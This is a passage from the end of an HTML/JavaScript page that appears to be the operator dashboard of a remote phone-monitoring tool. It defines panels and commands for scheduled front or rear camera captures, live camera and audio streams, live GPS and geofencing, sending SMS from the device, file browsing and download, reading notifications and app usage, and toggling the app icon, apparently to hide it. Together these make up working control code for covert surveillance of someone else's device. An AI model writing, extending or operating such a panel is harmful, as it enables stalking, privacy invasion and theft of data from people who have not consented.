                <div style="font-family:monospace;font-size:14px;word-break:break-all;line-height:1.6;">
                    ${clip?.content||'<em style="color:#ccc">Empty</em>'}</div>
            </div>`;
    }

    // ── Geofence ──────────────────────────────────────────────────────────────
    function showGeofencePanel() {
        panel.innerHTML = `<h3>🗺️ Geofence — Safety Zone</h3>
            <p style="color:#666;font-size:13px;margin-bottom:12px;">Click the map to set the safe zone centre, then click Set Fence.</p>
            <div id="geofenceMap" style="width:100%;height:300px;border-radius:10px;margin-bottom:12px;"></div>
            <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end;margin-bottom:12px;">
                <div><label style="font-size:12px;color:#999;">Latitude</label>
                    <input id="gfLat" type="number" step="0.000001" style="display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:130px;" placeholder="e.g. 20.2961"></div>
                <div><label style="font-size:12px;color:#999;">Longitude</label>
                    <input id="gfLon" type="number" step="0.000001" style="display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:130px;" placeholder="e.g. 85.8245"></div>
                <div><label style="font-size:12px;color:#999;">Radius (m)</label>
                    <input id="gfRadius" type="number" value="500" style="display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:90px;"></div>
                <div style="display:flex;gap:8px;">
                    <button onclick="setGeofence()" style="padding:8px 16px;background:#4caf50;color:#fff;border:none;border-radius:8px;cursor:pointer;">Set Fence</button>
                    <button onclick="sendCommand('CLEAR_GEOFENCE')" style="padding:8px 16px;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer;">Clear</button>
                    <button onclick="sendCommand('GET_GEOFENCE')" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;">Status</button>
                </div>
            </div>`;
        setTimeout(() => {
            try {
                const m = L.map('geofenceMap').setView([20.5937, 78.9629], 5);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);
                let marker, circle;
                m.on('click', e => {
                    const {lat, lng} = e.latlng;
                    document.getElementById('gfLat').value = lat.toFixed(6);
                    document.getElementById('gfLon').value = lng.toFixed(6);
                    if (marker) m.removeLayer(marker);
                    if (circle) m.removeLayer(circle);
                    marker = L.marker([lat, lng]).addTo(m);
                    circle = L.circle([lat, lng], {radius: parseFloat(document.getElementById('gfRadius').value)||500, color:'#1976ff', fillOpacity:0.15}).addTo(m);
                });
            } catch(e) { console.warn('Leaflet error:', e); }
        }, 100);
    }
    function setGeofence() {
        const lat = parseFloat(document.getElementById('gfLat').value);
        const lon = parseFloat(document.getElementById('gfLon').value);
        const radius = parseFloat(document.getElementById('gfRadius').value) || 500;
        if (isNaN(lat) || isNaN(lon)) { showNotification('Enter valid coordinates'); return; }
        sendCommand('SET_GEOFENCE', {lat, lon, radius});
    }
    function useLocationAsGeofence(lat, lon) {
        sendCommand('SET_GEOFENCE', {lat, lon, radius: 500});
        showNotification(`Geofence set at ${lat.toFixed(4)}, ${lon.toFixed(4)}`);
    }

    // ── Auto Screenshot Schedule ──────────────────────────────────────────────
    function showSchedulePanel() {
        panel.innerHTML = `<h3>⏱️ Auto Screenshot Capture</h3>
            <div style="display:flex;gap:12px;flex-wrap:wrap;align-items:flex-end;background:#f9f9f9;border-radius:10px;padding:16px;">
                <div><label style="font-size:12px;color:#999;">Interval (minutes)</label>
                    <input id="schedInterval" type="number" value="5" min="1" style="display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;width:90px;margin-top:4px;"></div>
                <div><label style="font-size:12px;color:#999;">Camera</label>
                    <select id="schedCam" style="display:block;padding:6px 10px;border:1px solid #ddd;border-radius:6px;margin-top:4px;">
                        <option value="0">Rear</option><option value="1">Front</option>
                    </select></div>
                <div style="display:flex;gap:8px;">
                    <button onclick="startScheduledCapture()" style="padding:8px 16px;background:#4caf50;color:#fff;border:none;border-radius:8px;cursor:pointer;">▶ Start</button>
                    <button onclick="sendCommand('STOP_SCHEDULED_CAPTURE')" style="padding:8px 16px;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer;">■ Stop</button>
                </div>
            </div>
            <p style="color:#999;font-size:12px;margin-top:10px;">Images will appear in the camera section when captured.</p>`;
    }
    function startScheduledCapture() {
        const intervalMinutes = parseInt(document.getElementById('schedInterval').value) || 5;
        const cameraId = parseInt(document.getElementById('schedCam').value);
        sendCommand('SET_SCHEDULED_CAPTURE', {intervalMinutes, cameraId});
        showNotification(`Auto-capture every ${intervalMinutes} min`);
    }

    // ── Send SMS ──────────────────────────────────────────────────────────────
    function showSendSmsPanel() {
        panel.innerHTML = `<h3>✉️ Send SMS</h3>
            <div style="display:flex;flex-direction:column;gap:12px;max-width:400px;margin-top:12px;">
                <div><label style="font-size:12px;color:#999;display:block;margin-bottom:4px;">Phone Number</label>
                    <input id="smsNumber" type="tel" placeholder="+91 99999 00000"
                        style="width:100%;padding:8px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;box-sizing:border-box;"></div>
                <div><label style="font-size:12px;color:#999;display:block;margin-bottom:4px;">Message</label>
                    <textarea id="smsBody" rows="4" placeholder="Type message…"
                        style="width:100%;padding:8px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;resize:vertical;box-sizing:border-box;"></textarea></div>
                <button onclick="doSendSms()" style="padding:10px 20px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;">📤 Send</button>
            </div>`;
    }
    function doSendSms() {
        const number = document.getElementById('smsNumber').value.trim();
        const body = document.getElementById('smsBody').value.trim();
        if (!number || !body) { showNotification('Enter number and message'); return; }
        sendCommand('SEND_SMS', {number, body});
    }

    // ── Table row filter utility ──────────────────────────────────────────────
    function filterRows(input, tbodyId) {
        const q = input.value.toLowerCase();
        document.getElementById(tbodyId)?.querySelectorAll('tr').forEach(row => {
            row.style.display = row.innerText.toLowerCase().includes(q) ? '' : 'none';
        });
    }

    // ---------- ATTACH FUNCTIONS TO WINDOW ----------
    window.toggleScreen = toggleScreen;
    window.toggleCameraPanel = toggleCameraPanel;
    window.capturePicture = capturePicture;
    window.startLiveStream = startLiveStream;
    window.stopLiveStream = stopLiveStream;
    window.toggleLiveAudio = toggleLiveAudio;
    window.stopLiveAudio = stopLiveAudio;
    window.sendCommand = sendCommand;
    window.sendPlainText = sendPlainText;
    window.toggleAppIcon = toggleAppIcon;
    window.takeSnapshot = takeSnapshot;
    window.toggleRecording = toggleRecording;
    window.downloadBase64 = downloadBase64;
    window.gotoPage = gotoPage;
    window.handleFolderClick = handleFolderClick;
    window.navigateUp = navigateUp;
    window.updateSelected = updateSelected;
    window.downloadSelected = downloadSelected;
    window.connectWebSocket = connectWebSocket;
    window.snapScreen = snapScreenFromModal;
    window.showAppUsagePanel = showAppUsagePanel;
    window.showGeofencePanel = showGeofencePanel;
    window.showSchedulePanel = showSchedulePanel;
    window.showSendSmsPanel = showSendSmsPanel;
    window.setGeofence = setGeofence;
    window.useLocationAsGeofence = useLocationAsGeofence;
    window.doSendSms = doSendSms;
    window.startScheduledCapture = startScheduledCapture;
    window.filterNotifs = filterNotifs;
    window.filterRows = filterRows;
    window.clearAlerts = clearAlerts;
    window.toggleLiveGps = toggleLiveGps;

    document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);

    // ---------- START ----------
    connectWebSocket();
</script>
</body>
</html>
